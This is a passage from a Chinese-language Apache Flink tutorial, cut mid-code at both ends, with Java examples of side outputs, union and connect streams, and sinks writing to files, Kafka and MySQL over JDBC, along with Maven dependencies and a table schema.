class="keyword">class</span>))</span>&#123;&#125;;</span><br><span class="line">       <span class="comment">//返回的都是主流</span></span><br><span class="line">        SingleOutputStreamOperator&lt;WaterSensor&gt; ds1 = ds.process(<span class="keyword">new</span> ProcessFunction&lt;WaterSensor, WaterSensor&gt;()</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">processElement</span><span class="params">(WaterSensor value, Context ctx, Collector&lt;WaterSensor&gt; out)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">"s1"</span>.equals(value.getId())) &#123;</span><br><span class="line">                    ctx.output(s1, value);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">"s2"</span>.equals(value.getId())) &#123;</span><br><span class="line">                    ctx.output(s2, value);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//主流</span></span><br><span class="line">                    out.collect(value);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        ds1.print(<span class="string">"主流，非s1,s2的传感器"</span>);</span><br><span class="line">        SideOutputDataStream&lt;WaterSensor&gt; s1DS = ds1.getSideOutput(s1);</span><br><span class="line">        SideOutputDataStream&lt;WaterSensor&gt; s2DS = ds1.getSideOutput(s2);</span><br><span class="line"></span><br><span class="line">        s1DS.printToErr(<span class="string">"s1"</span>);</span><br><span class="line">        s2DS.printToErr(<span class="string">"s2"</span>);</span><br><span class="line">        </span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-6-基本合流操作">3.6 基本合流操作</h3><p><strong>联合（Union）</strong></p><p>最简单的合流操作，就是直接将多条流合在一起，叫作流的“联合”（union）。联合操作要求必须流中的数据类型必须相同，合并之后的新流会包括所有流中的元素，数据类型不变</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UnionExample</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line">        DataStreamSource&lt;Integer&gt; ds1 = env.fromElements(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">        DataStreamSource&lt;Integer&gt; ds2 = env.fromElements(<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">        DataStreamSource&lt;String&gt; ds3 = env.fromElements(<span class="string">"2"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>);</span><br><span class="line">        ds1.union(ds2,ds3.map(Integer::valueOf))</span><br><span class="line">           .print();</span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>连接（Connect）</strong></p><p>流的联合虽然简单，不过受限于数据类型不能改变，灵活性大打折扣，所以实际应用较少出现。除了联合（union），Flink还提供了另外一种方便的合流操作——连接（connect）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ConnectDemo</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        DataStreamSource&lt;Integer&gt; source1 = env.fromElements(1, 2, 3);</span></span><br><span class="line"><span class="comment">//        DataStreamSource&lt;String&gt; source2 = env.fromElements("a", "b", "c");</span></span><br><span class="line">        SingleOutputStreamOperator&lt;Integer&gt; source1 = env</span><br><span class="line">                .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>)</span><br><span class="line">                .map(i -&gt; Integer.parseInt(i));</span><br><span class="line"></span><br><span class="line">        DataStreamSource&lt;String&gt; source2 = env.socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">8888</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * TODO 使用 connect 合流</span></span><br><span class="line"><span class="comment">         * 1、一次只能连接 2条流</span></span><br><span class="line"><span class="comment">         * 2、流的数据类型可以不一样</span></span><br><span class="line"><span class="comment">         * 3、 连接后可以调用 map、flatmap、process来处理，但是各处理各的</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        ConnectedStreams&lt;Integer, String&gt; connect = source1.connect(source2);</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;String&gt; result = connect.map(<span class="keyword">new</span> CoMapFunction&lt;Integer, String, String&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> String <span class="title">map1</span><span class="params">(Integer value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"来源于数字流:"</span> + value.toString();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> String <span class="title">map2</span><span class="params">(String value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"来源于字母流:"</span> + value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        result.print();</span><br><span class="line">        env.execute();    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然还有一个函数是<strong>CoProcessFunction</strong>，与CoMapFunction类似，如果是调用.map()就需要传入一个CoMapFunction，需要实现map1()、map2()两个方法；而调用.process()时，传入的则是一个CoProcessFunction</p><h2 id="4、输出算子">4、输出算子</h2><h3 id="4-1-连接到外部系统">4.1 连接到外部系统</h3><p>Flink的DataStream API专门提供了向外部写入数据的方法：addSink。与addSource类似，addSink方法对应着一个“Sink”算子，主要就是用来实现与外部系统连接、并将数据提交写入的；Flink程序中所有对外的输出操作，一般都是利用Sink算子完成的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// link1.12以前，Sink算子的创建是通过调用DataStream的.addSink()方法实现的</span></span><br><span class="line"><span class="comment">// addSink方法同样需要传入一个参数，实现的是SinkFunction接口。在这个接口中只需要重写一个方法invoke()，用来将指定的值写入到外部系统中。这个方法在每条数据记录到来时都会调用</span></span><br><span class="line">stream.addSink(<span class="keyword">new</span> SinkFunction(…));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Flink1.12开始，同样重构了Sink架构</span></span><br><span class="line"><span class="comment">// 之前我们一直在使用的print方法其实就是一种Sink，它表示将数据流写入标准控制台打印输出。Flink官方为我们提供了一部分的框架的Sink连接器</span></span><br><span class="line">stream.sinkTo(…)</span><br></pre></td></tr></table></figure><p>具体的输出连接器可以参考<a href="https://nightlies.apache.org/flink/flink-docs-release-1.17/docs/connectors/datastream/overview/" target="_blank" rel="noopener" title="官网">官网</a></p><h3 id="4-2-输出到文件">4.2 输出到文件</h3><p>Flink专门提供了一个流式文件系统的连接器：FileSink，为批处理和流处理提供了一个统一的Sink，它可以将分区文件写入Flink支持的文件系统。FileSink支持行编码（Row-encoded）和批量编码（Bulk-encoded）格式。这两种不同的方式都有各自的构建器（builder），可以直接调用FileSink的静态方法：</p><ul><li>行编码： FileSink.forRowFormat（basePath，rowEncoder）</li><li>批量编码： FileSink.forBulkFormat（basePath，bulkWriterFactory）</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SinkFile</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        <span class="comment">// 每个目录中，都有 并行度个数的 文件在写入</span></span><br><span class="line">        env.setParallelism(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">// 必须开启checkpoint，否则一直都是 .inprogress</span></span><br><span class="line">        env.enableCheckpointing(<span class="number">2000</span>, CheckpointingMode.EXACTLY_ONCE);</span><br><span class="line">        DataGeneratorSource&lt;String&gt; dataGeneratorSource = <span class="keyword">new</span> DataGeneratorSource&lt;&gt;(</span><br><span class="line">                <span class="keyword">new</span> GeneratorFunction&lt;Long, String&gt;() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> String <span class="title">map</span><span class="params">(Long value)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="string">"Number:"</span> + value;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                Long.MAX_VALUE,</span><br><span class="line">                RateLimiterStrategy.perSecond(<span class="number">1000</span>),</span><br><span class="line">                Types.STRING</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        DataStreamSource&lt;String&gt; dataGen = env.fromSource(dataGeneratorSource, WatermarkStrategy.noWatermarks(), <span class="string">"data-generator"</span>);</span><br><span class="line">        <span class="comment">// 输出到文件系统</span></span><br><span class="line">        FileSink&lt;String&gt; fieSink = FileSink</span><br><span class="line">                <span class="comment">// 输出行式存储的文件，指定路径、指定编码</span></span><br><span class="line">                .&lt;String&gt;forRowFormat(<span class="keyword">new</span> Path(<span class="string">"f:/tmp"</span>), <span class="keyword">new</span> SimpleStringEncoder&lt;&gt;(<span class="string">"UTF-8"</span>))</span><br><span class="line">                <span class="comment">// 输出文件的一些配置： 文件名的前缀、后缀</span></span><br><span class="line">                .withOutputFileConfig(</span><br><span class="line">                        OutputFileConfig.builder()</span><br><span class="line">                                .withPartPrefix(<span class="string">"atguigu-"</span>)</span><br><span class="line">                                .withPartSuffix(<span class="string">".log"</span>)</span><br><span class="line">                                .build()</span><br><span class="line">                )</span><br><span class="line">                <span class="comment">// 按照目录分桶：如下，就是每个小时一个目录</span></span><br><span class="line">                .withBucketAssigner(<span class="keyword">new</span> DateTimeBucketAssigner&lt;&gt;(<span class="string">"yyyy-MM-dd HH"</span>, ZoneId.systemDefault()))</span><br><span class="line">                <span class="comment">// 文件滚动策略:  1分钟 或 1m</span></span><br><span class="line">                .withRollingPolicy(</span><br><span class="line">                        DefaultRollingPolicy.builder()</span><br><span class="line">                                .withRolloverInterval(Duration.ofMinutes(<span class="number">1</span>))</span><br><span class="line">                                .withMaxPartSize(<span class="keyword">new</span> MemorySize(<span class="number">1024</span>*<span class="number">1024</span>))</span><br><span class="line">                                .build()</span><br><span class="line">                )</span><br><span class="line">                .build();</span><br><span class="line">        dataGen.sinkTo(fieSink);</span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-3-输出到Kafka">4.3 输出到Kafka</h3><p>添加号连接器依赖后，输出无key的record</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SinkKafka</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 如果是精准一次，必须开启checkpoint（后续章节介绍）</span></span><br><span class="line">        env.enableCheckpointing(<span class="number">2000</span>, CheckpointingMode.EXACTLY_ONCE);</span><br><span class="line">        SingleOutputStreamOperator&lt;String&gt; sensorDS = env</span><br><span class="line">                .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>);</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * Kafka Sink:</span></span><br><span class="line"><span class="comment">         * TODO 注意：如果要使用 精准一次 写入Kafka，需要满足以下条件，缺一不可</span></span><br><span class="line"><span class="comment">         * 1、开启checkpoint（后续介绍）</span></span><br><span class="line"><span class="comment">         * 2、设置事务前缀</span></span><br><span class="line"><span class="comment">         * 3、设置事务超时时间：   checkpoint间隔 &lt;  事务超时时间  &lt; max的15分钟</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        KafkaSink&lt;String&gt; kafkaSink = KafkaSink.&lt;String&gt;builder()</span><br><span class="line">                <span class="comment">// 指定 kafka 的地址和端口</span></span><br><span class="line">                .setBootstrapServers(<span class="string">"hadoop102:9092,hadoop103:9092,hadoop104:9092"</span>)</span><br><span class="line">                <span class="comment">// 指定序列化器：指定Topic名称、具体的序列化</span></span><br><span class="line">                .setRecordSerializer(</span><br><span class="line">                        KafkaRecordSerializationSchema.&lt;String&gt;builder()</span><br><span class="line">                                .setTopic(<span class="string">"ws"</span>)</span><br><span class="line">                                .setValueSerializationSchema(<span class="keyword">new</span> SimpleStringSchema())</span><br><span class="line">                                .build()</span><br><span class="line">                )</span><br><span class="line">                <span class="comment">// 写到kafka的一致性级别： 精准一次、至少一次</span></span><br><span class="line">                .setDeliveryGuarantee(DeliveryGuarantee.EXACTLY_ONCE)</span><br><span class="line">                <span class="comment">// 如果是精准一次，必须设置 事务的前缀</span></span><br><span class="line">                .setTransactionalIdPrefix(<span class="string">"atguigu-"</span>)</span><br><span class="line">                <span class="comment">// 如果是精准一次，必须设置 事务超时时间: 大于checkpoint间隔，小于 max 15分钟</span></span><br><span class="line">                .setProperty(ProducerConfig.TRANSACTION_TIMEOUT_CONFIG, <span class="number">10</span>*<span class="number">60</span>*<span class="number">1000</span>+<span class="string">""</span>)</span><br><span class="line">                .build();</span><br><span class="line">        sensorDS.sinkTo(kafkaSink);</span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自定义序列化器，实现带key的record</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SinkKafkaWithKey</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        env.enableCheckpointing(<span class="number">2000</span>, CheckpointingMode.EXACTLY_ONCE);</span><br><span class="line">        env.setRestartStrategy(RestartStrategies.noRestart());</span><br><span class="line">        SingleOutputStreamOperator&lt;String&gt; sensorDS = env</span><br><span class="line">                .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * 如果要指定写入kafka的key，可以自定义序列化器：</span></span><br><span class="line"><span class="comment">         * 1、实现 一个接口，重写 序列化 方法</span></span><br><span class="line"><span class="comment">         * 2、指定key，转成 字节数组</span></span><br><span class="line"><span class="comment">         * 3、指定value，转成 字节数组</span></span><br><span class="line"><span class="comment">         * 4、返回一个 ProducerRecord对象，把key、value放进去</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        KafkaSink&lt;String&gt; kafkaSink = KafkaSink.&lt;String&gt;builder()</span><br><span class="line">                .setBootstrapServers(<span class="string">"hadoop102:9092,hadoop103:9092,hadoop104:9092"</span>)</span><br><span class="line">                .setRecordSerializer(</span><br><span class="line">                        <span class="keyword">new</span> KafkaRecordSerializationSchema&lt;String&gt;() &#123;</span><br><span class="line"></span><br><span class="line">                            <span class="meta">@Nullable</span></span><br><span class="line">                            <span class="meta">@Override</span></span><br><span class="line">                            <span class="keyword">public</span> ProducerRecord&lt;<span class="keyword">byte</span>[], <span class="keyword">byte</span>[]&gt; serialize(String element, KafkaSinkContext context, Long timestamp) &#123;</span><br><span class="line">                                String[] datas = element.split(<span class="string">","</span>);</span><br><span class="line">                                <span class="keyword">byte</span>[] key = datas[<span class="number">0</span>].getBytes(StandardCharsets.UTF_8);</span><br><span class="line">                                <span class="keyword">byte</span>[] value = element.getBytes(StandardCharsets.UTF_8);</span><br><span class="line">                                <span class="keyword">return</span> <span class="keyword">new</span> ProducerRecord&lt;&gt;(<span class="string">"ws"</span>, key, value);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                )</span><br><span class="line">                .setDeliveryGuarantee(DeliveryGuarantee.EXACTLY_ONCE)</span><br><span class="line">                .setTransactionalIdPrefix(<span class="string">"atguigu-"</span>)</span><br><span class="line">                .setProperty(ProducerConfig.TRANSACTION_TIMEOUT_CONFIG, <span class="number">10</span> * <span class="number">60</span> * <span class="number">1000</span> + <span class="string">""</span>)</span><br><span class="line">                .build();</span><br><span class="line">        sensorDS.sinkTo(kafkaSink);</span><br><span class="line">        env.execute();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行代码，在Linux主机启动一个消费者，查看是否收到数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-console-consumer.sh --bootstrap-server hadoop102:9092 --topic ws</span><br></pre></td></tr></table></figure><h3 id="4-4-输出到MySQL（JDBC）">4.4 输出到MySQL（JDBC）</h3><p>添加MySQL驱动和flink驱动</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.flink<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>flink-connector-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.17-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--官方还未提供flink-connector-jdbc的1.17.0的正式依赖，暂时从apache snapshot仓库下载，pom文件中指定仓库路径--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>apache-snapshots<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>apache snapshots<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://repository.apache.org/content/repositories/snapshots/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--如果不生效，还需要修改本地maven的配置文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">id</span>&gt;</span>aliyunmaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>*,!apache-snapshots<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">name</span>&gt;</span>阿里云公共仓库<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br></pre></td></tr></table></figure><p>建表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`ws`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`ts`</span> <span class="built_in">bigint</span>(<span class="number">20</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`vc`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8</span><br></pre></td></tr></table></figure><p>编写输出到MySQL的示例代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SinkMySQL</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">        env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        SingleOutputStreamOperator&lt;WaterSensor&gt; sensorDS = env</span><br><span class="line">                .socketTextStream(<span class="string">"hadoop102"</span>, <span class="number">7777</span>)</span><br><span class="line">                .map(<span class="keyword">new</span> WaterSensorMapFunction());</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * TODO 写入mysql</span></span><br><span class="line"><span class="comment">         * 1、只能用老的sink写法： addsink</span></span><br><span class="line"><span class="comment">         * 2、JDBCSink的4个参数:</span></span><br><span class="line"><span class="comment">         *    第一个参数： 执行的sql，一般就是 insert into</span></span><br><span class="line"><span class="comment">         *    第二个参数： 预编译sql， 对占位符填充值</span></span><br><span class="line"><span class="comment">         *    第三个参数： 执行选项 ---》 攒批、重试</span></span><br><span class="line"><span 